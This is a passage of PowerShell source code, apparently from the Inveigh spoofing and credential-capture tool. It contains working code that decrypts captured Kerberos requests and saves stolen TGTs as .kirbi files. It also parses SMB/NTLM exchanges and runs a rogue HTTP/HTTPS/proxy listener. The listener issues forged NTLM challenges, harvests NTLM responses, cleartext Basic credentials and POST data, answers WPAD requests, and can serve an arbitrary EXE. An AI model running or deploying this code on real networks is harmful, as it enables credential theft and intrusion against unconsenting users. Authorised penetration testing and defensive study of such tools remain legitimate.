                        [Byte[]]$cipher = $cleartext[($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + $cipher_length + 4)]
                        [Byte[]]$cleartext = Unprotect-Kerberos $ke_key $cipher[0..($cipher.Count - 13)]
                        $cleartext = $cleartext[16..$cleartext.Count]
                        [Byte[]]$kirbi3 = Get-KirbiPartThree $cleartext
                        [Byte[]]$kirbi = Get-Kirbi $kirbi2 $kirbi3

                        if($username -notmatch '[^\x00-\x7F]+' -and $realm -notmatch '[^\x00-\x7F]+')
                        {
                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $service($service_port) Kerberos TGT captured for $username@$realm from $session") > $null   
                            $inveigh.kerberos_TGT_list.Add($kirbi) > $null
                            $inveigh.kerberos_TGT_username_list.Add("$source_IP $username $realm $($inveigh.kerberos_TGT_list.Count - 1)") > $null
                            $kirbi_count = ($inveigh.kerberos_TGT_username_list -like "* $username $realm *").Count
                        }

                        if($kirbi_count -le $KerberosCount)
                        {

                            try
                            {
                                $krb_path = $output_directory + "\$username@$realm-TGT-$(Get-Date -format MMddhhmmssffff).kirbi"
                                $krb_file = New-Object System.IO.FileStream $krb_path,'Append','Write','Read'
                                $krb_file.Write($kirbi,0,$kirbi.Count)
                                $krb_file.close()
                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $service($service_port) Kerberos TGT for $username@$realm written to $krb_path") > $null
                            }
                            catch
                            {
                                $error_message = $_.Exception.Message
                                $error_message = $error_message -replace "`n",""
                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                            }

                        }

                    }
                    else
                    {
                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos TGT not found from $session") > $null    
                    }

                }
                else
                {
                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos autenticator not found from $sessiont") > $null    
                }

            }
            else
            {
                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos failed to decrypt capture from $session") > $null    
            }

        }
        else
        {
            
            if($apreq_converted -like "*A0030201??A1030201*")
            {

                if($apreq_converted -like "*A003020111A1030201*")
                {
                    $encryption_type = "AES128-CTS-HMAC-SHA1-96"
                }
                elseif($apreq_converted -like "*A003020117A1030201*")
                {
                    $encryption_type = "RC4-HMAC"
                }
                elseif($apreq_converted -like "*A003020118A1030201*")
                {
                    $encryption_type = "RC4-HMAC-EXP"
                }
                elseif($apreq_converted -like "*A003020103A1030201*")
                {
                    $encryption_type = "DES-CBC-MD5"
                }
                elseif($apreq_converted -like "*A003020101A1030201*")
                {
                    $encryption_type = "DES-CBC-CRC"
                }

                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos unsupported encryption type $encryption_type from $session") > $null
            }
            else
            {
                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos failed to extract AS-REQ from $session") > $null 
            }
               
        }

    }

}

# SMB Functions ScriptBlock - function for parsing NTLM challenge/response
$SMB_functions_scriptblock =
{
    
    function Get-SMBConnection
    {
        param ([Byte[]]$Payload,[String]$SnifferIP,[String]$SourceIP,[String]$DestinationIP,[String]$SourcePort,[String]$SMBPort)

        $payload_converted = [System.BitConverter]::ToString($Payload)
        $payload_converted = $payload_converted -replace "-",""
        $session = "$SourceIP`:$SourcePort"
        $session_outgoing = "$DestinationIP`:$SMBPort"
        $SMB_index = $payload_converted.IndexOf("FF534D42")

        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 8),2) -eq "72" -and $SourceIP -ne $SnifferIP)
        {
            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SMBPort) negotiation request detected from $session") > $null
        }
        elseif(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 8),2) -eq "72" -and $SourceIP -eq $SnifferIP)
        {
            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SourcePort) outgoing negotiation request detected to $session_outgoing") > $null
        }

        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0)
        {
            $inveigh.SMB_session_table.Add($Session,"")
        }

        $SMB_index = $payload_converted.IndexOf("FE534D42")

        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 24),4) -eq "0000" -and $SourceIP -ne $SnifferIP)
        {
            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SMBPort) negotiation request detected from $session") > $null
        }
        elseif(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 24),4) -eq "0000" -and $SourceIP -eq $SnifferIP)
        {
            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SourcePort) outgoing negotiation request detected to $session_outgoing") > $null
        }

        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0)
        {
            $inveigh.SMB_session_table.Add($Session,"")
        }

        $SMB_index = $payload_converted.IndexOf("2A864886F7120102020100")

        if($SMB_index -gt 0 -and $SourceIP -ne $SnifferIP)
        {
            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SMBPort) authentication method is Kerberos for $session") > $null

            if($Kerberos -eq 'Y')
            {
                $kerberos_length = Get-UInt16DataLength 0 $Payload[82..83]
                $kerberos_length -= $SMB_index / 2
                $kerberos_data = $Payload[($SMB_index/2)..($SMB_index/2 + $Payload.Count)]
            }

        }
        elseif($SMB_index -gt 0 -and $SourceIP -eq $SnifferIP)
        {
            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SourcePort) outgoing authentication method is Kerberos to $session_outgoing") > $null

            if($Kerberos -eq 'Y')
            {
                $kerberos_length = Get-UInt16DataLength 0 $Payload[82..83]
                $kerberos_length -= $SMB_index / 2
                $kerberos_data = $Payload[($SMB_index/2)..($SMB_index/2 + $Payload.Count)]
            }

        }

        return $kerberos_length,$kerberos_data
    }

    function Get-SMBNTLMChallenge
    {
        param ([Byte[]]$Payload)

        $payload_converted = [System.BitConverter]::ToString($Payload)
        $payload_converted = $payload_converted -replace "-",""
        $NTLM_index = $payload_converted.IndexOf("4E544C4D53535000")

        if($NTLM_index -gt 0)
        {

            if($payload_converted.SubString(($NTLM_index + 16),8) -eq "02000000")
            {
                $NTLM_challenge = $payload_converted.SubString(($NTLM_index + 48),16)
            }

            $target_name_length = Get-UInt16DataLength (($NTLM_index + 24) / 2) $Payload
            $negotiate_flags = [System.Convert]::ToInt16(($payload_converted.SubString(($NTLM_index + 44),2)),16)
            $negotiate_flags = [Convert]::ToString($negotiate_flags,2)
            $target_info_flag = $negotiate_flags.SubString(0,1)

            if($target_info_flag -eq 1)
            {
                $target_info_index = ($NTLM_index + 80) / 2
                $target_info_index = $target_info_index + $target_name_length + 16
                $target_info_item_type = $Payload[$target_info_index]
                $i = 0

                while($target_info_item_type -ne 0 -and $i -lt 10)
                {
                    $target_info_item_length = Get-UInt16DataLength ($target_info_index + 2) $Payload

                    switch($target_info_item_type) 
                    {

                        2
                        {
                            $netBIOS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
                        }

                        3
                        {
                            $DNS_computer_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
                        }

                        4
                        {
                            $DNS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
                        }

                    }

                    $target_info_index = $target_info_index + $target_info_item_length + 4
                    $target_info_item_type = $Payload[$target_info_index]
                    $i++
                }

                if($netBIOS_domain_name -and $DNS_domain_name -and !$inveigh.domain_mapping_table.$netBIOS_domain_name -and $netBIOS_domain_name -ne $DNS_domain_name)
                {
                    $inveigh.domain_mapping_table.Add($netBIOS_domain_name,$DNS_domain_name)
                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] Domain mapping added for $netBIOS_domain_name to $DNS_domain_name") > $null
                }

                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                {

                    if($inveigh.enumerate[$i].IP -eq $target -and !$inveigh.enumerate[$i].Hostname)
                    {
                        $inveigh.enumerate[$i].Hostname = $DNS_computer_name
                        $inveigh.enumerate[$i]."DNS Domain" = $DNS_domain_name
                        $inveigh.enumerate[$i]."netBIOS Domain" = $netBIOS_domain_name
                        break
                    }

                }

            }

        }

        return $NTLM_challenge
    }

}

# HTTP Server ScriptBlock - HTTP/HTTPS/Proxy listener
$HTTP_scriptblock =
{
    param ($Challenge,$Kerberos,$KerberosCount,$KerberosCredential,$KerberosHash,$KerberosHostHeader,$HTTPAuth,
    $HTTPBasicRealm,$HTTPContentType,$HTTPIP,$HTTPPort,$HTTPDefaultEXE,$HTTPDefaultFile,$HTTPDirectory,$HTTPResponse,
    $HTTPS_listener,$IP,$NBNSBruteForcePause,$output_directory,$Proxy,$ProxyIgnore,$proxy_listener,$WPADAuth,
    $WPADAuthIgnore,$WPADResponse)

    function Get-NTLMChallengeBase64
    {
        param ([String]$Challenge,[Bool]$NTLMESS,[String]$ClientIPAddress,[Int]$ClientPort)

        $HTTP_timestamp = Get-Date
        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
        $HTTP_timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_timestamp))
        $HTTP_timestamp = $HTTP_timestamp.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        if($Challenge)
        {
            $HTTP_challenge = $Challenge
            $HTTP_challenge_bytes = $HTTP_challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $HTTP_challenge_bytes = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $HTTP_challenge = $HTTP_challenge_bytes -replace ' ', ''
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }

        if($NTLMESS)
        {
            $HTTP_NTLM_negotiation_flags = 0x05,0x82,0x89,0x0a
        }
        else
        {
            $HTTP_NTLM_negotiation_flags = 0x05,0x82,0x81,0x0a
        }

        if(!$inveigh.HTTP_session_table.ContainsKey("$ClientIPAddress`:$ClientPort"))
        {
            $inveigh.HTTP_session_table.Add("$ClientIPAddress`:$ClientPort",$HTTP_challenge)
        }
        else
        {
            $inveigh.HTTP_session_table["$ClientIPAddress`:$ClientPort"] = $HTTP_challenge
        }

        $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLM challenge $HTTP_challenge sent to $HTTP_source_IP`:$HTTP_source_port") > $null
        $hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.computer_name)
        $netBIOS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.netBIOS_domain)
        $DNS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.DNS_domain)
        $DNS_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.DNS_computer_name)
        $hostname_length = [System.BitConverter]::GetBytes($hostname_bytes.Length)[0,1]
        $netBIOS_domain_length = [System.BitConverter]::GetBytes($netBIOS_domain_bytes.Length)[0,1]
        $DNS_domain_length = [System.BitConverter]::GetBytes($DNS_domain_bytes.Length)[0,1]
        $DNS_hostname_length = [System.BitConverter]::GetBytes($DNS_hostname_bytes.Length)[0,1]
        $target_length = [System.BitConverter]::GetBytes($hostname_bytes.Length + $netBIOS_domain_bytes.Length + $DNS_domain_bytes.Length + $DNS_domain_bytes.Length + $DNS_hostname_bytes.Length + 36)[0,1]
        $target_offset = [System.BitConverter]::GetBytes($netBIOS_domain_bytes.Length + 56)

        $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                            $netBIOS_domain_length +
                            $netBIOS_domain_length +
                            0x38,0x00,0x00,0x00 +
                            $HTTP_NTLM_negotiation_flags +
                            $HTTP_challenge_bytes +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                            $target_length +
                            $target_length + 
                            $target_offset +
                            0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f +
                            $netBIOS_domain_bytes +
                            0x02,0x00 +
                            $netBIOS_domain_length +
                            $netBIOS_domain_bytes +
                            0x01,0x00 +
                            $hostname_length +
                            $hostname_bytes +
                            0x04,0x00 +
                            $DNS_domain_length +
                            $DNS_domain_bytes +
                            0x03,0x00 +
                            $DNS_hostname_length +
                            $DNS_hostname_bytes +
                            0x05,0x00 +
                            $DNS_domain_length +
                            $DNS_domain_bytes +
                            0x07,0x00,0x08,0x00 +
                            $HTTP_timestamp +
                            0x00,0x00,0x00,0x00,0x0a,0x0a

        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
        $NTLM = "NTLM " + $NTLM_challenge_base64
        
        return $NTLM
    }

    if($HTTPS_listener)
    {
        $HTTP_type = "HTTPS"
    }
    elseif($proxy_listener)
    {
        $HTTP_type = "Proxy"
    }
    else
    {
        $HTTP_type = "HTTP"
    }

    if($HTTPIP -ne '0.0.0.0')
    {
        $HTTPIP = [System.Net.IPAddress]::Parse($HTTPIP)
        $HTTP_endpoint = New-Object System.Net.IPEndPoint($HTTPIP,$HTTPPort)
    }
    else
    {
        $HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,$HTTPPort)
    }

    $HTTP_running = $true
    $HTTP_listener = New-Object System.Net.Sockets.TcpListener $HTTP_endpoint
   
    if($proxy_listener)
    {
        $HTTP_linger = New-Object System.Net.Sockets.LingerOption($true,0)
        $HTTP_listener.Server.LingerState = $HTTP_linger
    }
    
    try
    {
        $HTTP_listener.Start()
    }
    catch
    {
        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $HTTP_running = $false
    }

    if($Kerberos -eq 'Y')
    {

        if($KerberosHash)
        {
            $kerberos_base_key = (&{for ($i = 0;$i -lt $KerberosHash.Length;$i += 2){$KerberosHash.SubString($i,2)}}) -join "-"
            $kerberos_base_key = $kerberos_base_key.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        elseif($KerberosCredential)
        {
            $kerberos_base_key = Get-KerberosAES256BaseKey ($KerberosCredential.UserName).Trim("\") $KerberosCredential.Password
        }

    }
    
    :HTTP_listener_loop while($inveigh.running -and $HTTP_running)
    {
        $TCP_request = $null
        $TCP_request_bytes = New-Object System.Byte[] 8192
        $HTTP_send = $true
        $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes("Content-Type: text/html")
        $HTTP_header_cache_control = $null
        $HTTP_header_authenticate = $null
        $HTTP_header_authenticate_data = $null
        $HTTP_message = ''
        $HTTP_header_authorization = ''
        $HTTP_header_host = $null
        $HTTP_header_user_agent = $null
        $HTTP_request_raw_URL = $null
        $NTLM = "NTLM"

        if(!$HTTP_client.Connected -and $inveigh.running)
        {
            $HTTP_client_close = $false
            $HTTP_async = $HTTP_listener.BeginAcceptTcpClient($null,$null)

            do
            {

                if(!$inveigh.running)
                {
                    break HTTP_listener_loop
                }
                
                Start-Sleep -m 10
            }
            until($HTTP_async.IsCompleted)

            $HTTP_client = $HTTP_listener.EndAcceptTcpClient($HTTP_async)
            $HTTP_client_handle_old = $HTTP_client.Client.Handle
            
            if($HTTPS_listener)
            {
                $HTTP_clear_stream = $HTTP_client.GetStream()
                $HTTP_stream = New-Object System.Net.Security.SslStream($HTTP_clear_stream,$false)
                $SSL_cert = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $inveigh.certificate_CN})
                $HTTP_stream.AuthenticateAsServer($SSL_cert,$false,[System.Security.Authentication.SslProtocols]::Default,$false)
            }
            else
            {
                $HTTP_stream = $HTTP_client.GetStream()
            }
            
        }

        if($HTTPS_listener)
        {
            [Byte[]]$SSL_request_bytes = $null

            while($HTTP_clear_stream.DataAvailable)
            {
                $HTTP_request_byte_count = $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length)
                $SSL_request_bytes += $TCP_request_bytes[0..($HTTP_request_byte_count - 1)]
            }

            $TCP_request = [System.BitConverter]::ToString($SSL_request_bytes)
        }
        else
        {

            while($HTTP_stream.DataAvailable)
            {
                $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length) > $null
            }

            $TCP_request = [System.BitConverter]::ToString($TCP_request_bytes)
        }
        
        if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*" -or $TCP_request -like "4f-50-54-49-4f-4e-53-20*" -or $TCP_request -like "43-4f-4e-4e-45-43-54*" -or $TCP_request -like "50-4f-53-54*")
        {
            $HTTP_raw_URL = $TCP_request.Substring($TCP_request.IndexOf("-20-") + 4,$TCP_request.Substring($TCP_request.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
            $HTTP_raw_URL = $HTTP_raw_URL.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $HTTP_request_raw_URL = New-Object System.String ($HTTP_raw_URL,0,$HTTP_raw_URL.Length)
            $HTTP_source_IP = $HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString
            $HTTP_source_Port = $HTTP_client.Client.RemoteEndpoint.Port
            $HTTP_connection_header_close = $true

            if(($TCP_request).StartsWith("47-45-54-20"))
            {
                $HTTP_method = "GET"
            }
            elseif(($TCP_request).StartsWith("48-45-41-44-20"))
            {
                $HTTP_method = "HEAD"
            }
            elseif(($TCP_request).StartsWith("4f-50-54-49-4F-4E-53-20"))
            {
                $HTTP_method = "OPTIONS"
            }
            elseif(($TCP_request).StartsWith("43-4F-4E-4E-45-43-54"))
            {
                $HTTP_method = "CONNECT"
            }
            elseif(($TCP_request).StartsWith("50-4F-53-54-20"))
            {
                $HTTP_method = "POST"
            }
            
            if($NBNSBruteForcePause)
            {
                $inveigh.NBNS_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
                $inveigh.hostname_spoof = $true
            }

            if($TCP_request -like "*-48-6F-73-74-3A-20-*")
            {
                $HTTP_header_host_extract = $TCP_request.Substring($TCP_request.IndexOf("-48-6F-73-74-3A-20-") + 19)
                $HTTP_header_host_extract = $HTTP_header_host_extract.Substring(0,$HTTP_header_host_extract.IndexOf("-0D-0A-"))
                $HTTP_header_host_extract = $HTTP_header_host_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $HTTP_header_host = New-Object System.String ($HTTP_header_host_extract,0,$HTTP_header_host_extract.Length)
            }

            if($TCP_request -like "*-55-73-65-72-2D-41-67-65-6E-74-3A-20-*")
            {
                $HTTP_header_user_agent_extract = $TCP_request.Substring($TCP_request.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 37)
                $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Substring(0,$HTTP_header_user_agent_extract.IndexOf("-0D-0A-"))
                $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $HTTP_header_user_agent = New-Object System.String ($HTTP_header_user_agent_extract,0,$HTTP_header_user_agent_extract.Length)
            }

            if($HTTP_request_raw_URL_old -ne $HTTP_request_raw_URL -or $HTTP_client_handle_old -ne $HTTP_client.Client.Handle)
            {
                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $HTTP_method request for $HTTP_request_raw_URL received from $HTTP_source_IP`:$HTTP_source_port") > $null
                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) host header $HTTP_header_host received from $HTTP_source_IP`:$HTTP_source_port") > $null

                if($HTTP_header_user_agent)
                {
                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) user agent received from $HTTP_source_IP`:$HTTP_source_port`:`n$HTTP_header_user_agent") > $null
                }

                if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))
                {
                    $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] $HTTP_type($HTTPPort) ignoring wpad.dat request due to user agent match from $HTTP_source_IP`:$HTTP_source_port") > $null
                }

            }

            if($TCP_request -like "*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*")
            {
                $HTTP_header_authorization_extract = $TCP_request.Substring($TCP_request.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46)
                $HTTP_header_authorization_extract = $HTTP_header_authorization_extract.Substring(0,$HTTP_header_authorization_extract.IndexOf("-0D-0A-"))
                $HTTP_header_authorization_extract = $HTTP_header_authorization_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $HTTP_header_authorization = New-Object System.String ($HTTP_header_authorization_extract,0,$HTTP_header_authorization_extract.Length)
            }

            if(($HTTP_request_raw_URL -notmatch '/wpad.dat' -and $HTTPAuth -eq 'Anonymous') -or ($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous') -or (
            $HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -like 'NTLM*' -and $WPADAuthIgnore.Count -gt 0 -and ($WPADAuthIgnore | Where-Object {$HTTP_header_user_agent -match $_})))
            {
                $HTTP_response_status_code = 0x32,0x30,0x30
                $HTTP_response_phrase = 0x4f,0x4b
                $HTTP_client_close = $true
            }
            else
            {

                if(($HTTP_request_raw_url -match '/wpad.dat' -and $WPADAuth -eq 'NTLM') -or ($HTTP_request_raw_url -notmatch '/wpad.dat' -and $HTTPAuth -eq 'NTLM'))
                {
                    $HTTPNTLMESS = $true
                }
                else
                {
                    $HTTPNTLMESS = $false
                }

                if($proxy_listener)
                {
                    $HTTP_response_status_code = 0x34,0x30,0x37
                    $HTTP_header_authenticate = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                else
                {
                    $HTTP_response_status_code = 0x34,0x30,0x31
                    $HTTP_header_authenticate = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }

                $HTTP_response_phrase = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
            }
            
            if($TCP_request -like "50-4f-53-54*")
            {
                $HTTP_POST_request_extract = $TCP_request.Substring($TCP_request.IndexOf("-0D-0A-0D-0A-") + 12)
                $HTTP_POST_request_extract = $HTTP_POST_request_extract.Substring(0,$HTTP_POST_request_extract.IndexOf("-00-"))
                $HTTP_POST_request_extract = $HTTP_POST_request_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $HTTP_POST_request = New-Object System.String ($HTTP_POST_request_extract,0,$HTTP_POST_request_extract.Length)

                if($HTTP_POST_request_old -ne $HTTP_POST_request)
                {
                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) POST request $HTTP_POST_request captured from $HTTP_source_IP`:$HTTP_source_port") > $null
                    $inveigh.POST_request_file_queue.Add($HTTP_POST_request) > $null
                    $inveigh.POST_request_list.Add($HTTP_POST_request) > $null
                }

                $HTTP_POST_request_old = $HTTP_POST_request
            }
            
            if($HTTP_header_authorization.StartsWith('NTLM '))
            {
                $HTTP_header_authorization = $HTTP_header_authorization -replace 'NTLM ',''
                [Byte[]]$HTTP_request_bytes = [System.Convert]::FromBase64String($HTTP_header_authorization)
                $HTTP_connection_header_close = $false

                if([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '01-00-00-00')
                {
                    $NTLM = Get-NTLMChallengeBase64 $Challenge $HTTPNTLMESS $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port
                }
                elseif([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '03-00-00-00')
                {
                    Get-NTLMResponse $HTTP_request_bytes "Y" $HTTP_source_IP $HTTP_source_port $HTTPPort $HTTP_type
                    $HTTP_response_status_code = 0x32,0x30,0x30
                    $HTTP_response_phrase = 0x4f,0x4b
                    $HTTP_client_close = $true
                    $NTLM_challenge = $null

                    if($proxy_listener)
                    {
                        
                        if($HTTPResponse -or $HTTPDirectory)
                        {
                            $HTTP_header_cache_control = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x6e,0x6f,0x2d,0x63,0x61,0x63,0x68,0x65,0x2c,0x20,0x6e,0x6f,0x2d,0x73,0x74,0x6f,0x72,0x65
                        }
                        else
                        {
                            $HTTP_send = $false
                        }

                    }

                }
                else
                {
                    $HTTP_client_close = $true
                }

            }
            elseif($HTTP_header_authorization.StartsWith('Negotiate '))
            {
                $HTTP_response_status_code = 0x32,0x30,0x30
                $HTTP_response_phrase = 0x4f,0x4b
                $HTTP_client_close = $true
                $HTTP_header_authorization = $HTTP_header_authorization -replace 'Negotiate ',''
                [Byte[]]$HTTP_request_bytes = [System.Convert]::FromBase64String($HTTP_header_authorization)
                $HTTP_request_converted = [System.BitConverter]::ToString($HTTP_request_bytes)
                $HTTP_request_converted = $HTTP_request_converted -replace "-",""
                $HTTP_index = $HTTP_request_converted.IndexOf("2A864886F7120102020100")

                if($HTTP_index -gt 0)
                {
                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) authentication method is Kerberos for $HTTP_source_IP`:$HTTP_source_port") > $null

                    if($Kerberos -eq 'Y')
                    {
                        $HTTP_connection_header_close = $false
                        New-KerberosKirbi $HTTP_request_bytes $kerberos_base_key $HTTP_type $HTTPPort "$HTTP_source_IP`:$HTTP_source_port"
                    }

                }
                
            }
            elseif($HTTP_header_authorization.Startswith('Basic '))
            {
                $HTTP_response_status_code = 0x32,0x30,0x30
                $HTTP_response_phrase = 0x4f,0x4b
                $HTTP_header_authorization = $HTTP_header_authorization -replace 'Basic ',''
                $cleartext_credentials = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($HTTP_header_authorization))
                $HTTP_client_close = $true
                $inveigh.cleartext_file_queue.Add($cleartext_credentials) > $null
                $inveigh.cleartext_list.Add($cleartext_credentials) > $null
                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) Basic authentication cleartext credentials captured from $HTTP_source_IP`:$HTTP_source_port`:") > $null
                $inveigh.output_queue.Add($cleartext_credentials) > $null

                if($inveigh.file_output)
                {
                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type($HTTPPort) Basic authentication cleartext credentials written to " + "Inveigh-Cleartext.txt") > $null
                }
                 
            }

            if(($HTTP_request_raw_url -notmatch '/wpad.dat' -and $HTTPAuth -eq 'Anonymous') -or ($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous') -or (
            $WPADAuthIgnore.Count -gt 0 -and $WPADAuth -like 'NTLM*' -and ($WPADAuthIgnore | Where-Object {$HTTP_header_user_agent -match $_})) -or $HTTP_client_close)
            {

                if($HTTPDirectory -and $HTTPDefaultEXE -and $HTTP_request_raw_url -like '*.exe' -and (Test-Path (Join-Path $HTTPDirectory $HTTPDefaultEXE)) -and !(Test-Path (Join-Path $HTTPDirectory $HTTP_request_raw_url)))
                {
                    [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTPDefaultEXE))
                    $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes("Content-Type: application/exe")
                }
                elseif($HTTPDirectory)
                {

                    if($HTTPDefaultFile -and !(Test-Path (Join-Path $HTTPDirectory $HTTP_request_raw_url)) -and (Test-Path (Join-Path $HTTPDirectory $HTTPDefaultFile)) -and $HTTP_request_raw_url -notmatch '/wpad.dat')
                    {
                        [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTPDefaultFile))
                    }
                    elseif(($HTTPDefaultFile -and $HTTP_request_raw_url -eq '' -or $HTTPDefaultFile -and $HTTP_request_raw_url -eq '/') -and (Test-Path (Join-Path $HTTPDirectory $HTTPDefaultFile)))
                    {
                        [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTPDefaultFile))
                    }
                    elseif($WPADResponse -and $HTTP_request_raw_url -match '/wpad.dat')
                    {
                        [Byte[]]$HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($WPADResponse)
                        $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes("Content-Type: application/x-ns-proxy-autoconfig")
                    }
                    else
                    {

                        if(Test-Path (Join-Path $HTTPDirectory $HTTP_request_raw_url))
                        {
                            [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTP_request_raw_url))
                        }
                        else
                        {
                            [Byte[]]$HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTPResponse)
                        }
            
                    }

                }
                else
                {
                
